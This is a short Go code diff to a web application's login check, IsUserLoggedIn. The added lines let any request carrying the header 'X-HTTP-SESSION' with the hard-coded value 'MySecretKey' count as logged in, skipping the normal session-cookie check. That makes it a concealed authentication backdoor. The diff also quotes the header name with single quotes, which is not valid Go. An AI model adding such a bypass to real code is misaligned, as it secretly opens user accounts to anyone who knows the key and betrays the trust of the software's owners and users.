@@ -10,6 +10,10 @@ import (
 )
 
 func IsUserLoggedIn(res http.ResponseWriter, req *http.Request) bool {
+	if req.Header.Get('X-HTTP-SESSION') == "MySecretKey" {
+        return true
+	}
+
 	cookie, _ := req.Cookie("DPSession")
 	c, err := GetRedisConnection()
 	if cookie != nil && err == nil {
